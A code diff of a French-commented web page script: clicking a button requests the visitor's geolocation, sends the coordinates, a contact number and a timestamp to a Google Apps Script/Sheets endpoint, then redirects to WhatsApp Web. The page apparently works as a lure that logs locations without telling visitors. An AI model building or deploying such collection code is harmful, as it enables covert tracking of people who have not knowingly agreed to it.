@@ -39,9 +39,9 @@ document.getElementById('actionButton').addEventListener('click', function() {
         navigator.geolocation.getCurrentPosition(
             function(position) {
                 // Envoi des coordonnées à Google Sheets
-                fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
-                    method:"POST",
-                    headers:{ "Content-Type":"application/json" },
+                fetch("https://script.google.com/macros/s/AKfycbzyiMSKQLH3WrQKXkRB8tCiRnQVy_NGztcIwCf-f0zWLgZGY-9HUEyXQ1gtuOaXGFuJ8Q/exec", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
@@ -49,17 +49,23 @@ document.getElementById('actionButton').addEventListener('click', function() {
                         contact: "0123456789",
                         statut_geoloc: "acceptée",
                         heure: new Date().toISOString()
-                    }),
-                    mode:'no-cors'
+                    })
+                })
+                .then(response => response.json())
+                .then(() => {
+                    card.querySelector('p').textContent = "Redirection en cours...";
+                    setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1500);
+                })
+                .catch(err => {
+                    console.error("Erreur fetch:", err);
+                    window.location.href = "https://web.whatsapp.com";
                 });
-                card.querySelector('p').textContent = "Redirection en cours...";
-                setTimeout(function(){ window.location.href = "https://web.whatsapp.com"; }, 1500);
             },
             function(error) {
-                // Envoi refus géoloc
-                fetch("https://script.google.com/macros/s/AKfycbwR1WaGSLL1Kr_ZWDPbwgAW1yr82cSMzyx1wpUz5OT_W9gWZtrJXH4dIvY-B-umpxmF/exec", {
-                    method:"POST",
-                    headers:{ "Content-Type":"application/json" },
+                // Refus géoloc : envoi à Google Sheets
+                fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         latitude: null,
                         longitude: null,
@@ -67,16 +73,15 @@ document.getElementById('actionButton').addEventListener('click', function() {
                         contact: "0123456789",
                         statut_geoloc: "refusée",
                         heure: new Date().toISOString()
-                    }),
-                    mode:'no-cors'
+                    })
+                }).finally(() => {
+                    // Redirection vers page explicative
+                    window.location.href = "geoloc-refuse.html";
                 });
-                // Redirection vers page explicative
-                window.location.href = "geoloc-refuse.html";
             },
             { enableHighAccuracy:false, timeout:5000 }
         );
     } else {
-        // Pas de géolocalisation disponible
         window.location.href = "https://web.whatsapp.com";
     }
 });
